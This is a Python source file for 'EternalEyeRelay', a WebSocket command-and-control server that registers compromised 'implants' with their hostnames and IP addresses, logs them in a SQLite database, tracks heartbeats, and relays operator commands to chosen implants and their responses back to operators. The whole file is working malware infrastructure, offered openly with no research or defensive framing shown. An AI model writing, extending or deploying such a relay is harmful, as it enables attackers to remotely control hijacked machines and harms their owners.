#!/usr/bin/env python3
import asyncio
import json
import logging
import sqlite3
from datetime import datetime
from typing import Dict, Set
import websockets

class EternalEyeRelay:
    def __init__(self, host='0.0.0.0', implant_port=8765, operator_port=8766):
        self.host = host
        self.implant_port = implant_port
        self.operator_port = operator_port
        self.active_implants: Dict[str, websockets.WebSocketServerProtocol] = {}
        self.operator_connections: Set[websockets.WebSocketServerProtocol] = set()
        self.setup_database()
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('logs/relay.log'),
                logging.StreamHandler()
            ]
        )
        
    def setup_database(self):
        self.conn = sqlite3.connect('eternal_eye.db', check_same_thread=False)
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS implants (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                ip_address TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT
            )
        ''')
        self.conn.commit()
        
    async def handle_implant(self, websocket, path):
        implant_id = None
        try:
            async for message in websocket:
                data = json.loads(message)
                
                if data.get('type') == 'register':
                    implant_id = await self.register_implant(websocket, data)
                elif data.get('type') == 'heartbeat':
                    await self.update_implant_heartbeat(implant_id)
                elif data.get('type') == 'response':
                    await self.forward_to_operators(message)
                    
        except Exception as e:
            logging.error(f"Implant error: {e}")
        finally:
            if implant_id and implant_id in self.active_implants:
                del self.active_implants[implant_id]
                await self.mark_implant_offline(implant_id)
                
    async def handle_operator(self, websocket, path):
        self.operator_connections.add(websocket)
        try:
            await self.send_implant_list(websocket)
            async for message in websocket:
                await self.forward_to_implant(message)
        except Exception as e:
            logging.error(f"Operator error: {e}")
        finally:
            self.operator_connections.remove(websocket)
            
    async def register_implant(self, websocket, data):
        implant_id = data.get('implant_id', 'unknown')
        
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO implants VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            implant_id,
            data.get('hostname', 'unknown'),
            data.get('ip_address', 'unknown'),
            datetime.now(),
            datetime.now(),
            'online'
        ))
        self.conn.commit()
        
        self.active_implants[implant_id] = websocket
        logging.info(f"Implant registered: {implant_id}")
        
        await self.broadcast_to_operators(json.dumps({
            'type': 'implant_online',
            'implant_id': implant_id,
            'data': data
        }))
        
        return implant_id
        
    async def update_implant_heartbeat(self, implant_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE implants SET last_seen = ? WHERE id = ?', (datetime.now(), implant_id))
        self.conn.commit()
        
    async def mark_implant_offline(self, implant_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE implants SET status = ? WHERE id = ?', ('offline', implant_id))
        self.conn.commit()
        logging.info(f"Implant offline: {implant_id}")
        
    async def forward_to_implant(self, message):
        data = json.loads(message)
        implant_id = data.get('implant_id')
        
        if implant_id in self.active_implants:
            await self.active_implants[implant_id].send(message)
            
    async def forward_to_operators(self, message):
        for operator in self.operator_connections:
            try:
                await operator.send(message)
            except:
                pass
                
    async def send_implant_list(self, websocket):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM implants WHERE status = "online"')
        implants = cursor.fetchall()
        
        await websocket.send(json.dumps({
            'type': 'implant_list',
            'implants': [
                {
                    'id': row[0],
                    'hostname': row[1],
                    'ip_address': row[2],
                    'first_seen': row[3],
                    'last_seen': row[4],
                    'status': row[5]
                } for row in implants
            ]
        }))
        
    async def start_server(self):
        # Start implant server
        implant_server = await websockets.serve(
            self.handle_implant, self.host, self.implant_port
        )
        
        # Start operator server
        operator_server = await websockets.serve(
            self.handle_operator, self.host, self.operator_port
        )
        
        logging.info(f"Relay server started:")
        logging.info(f"  - Implants: {self.host}:{self.implant_port}")
        logging.info(f"  - Operators: {self.host}:{self.operator_port}")
        
        await asyncio.Future()  # Run forever

async def main():
    relay = EternalEyeRelay()
    await relay.start_server()

if __name__ == "__main__":
    asyncio.run(main())
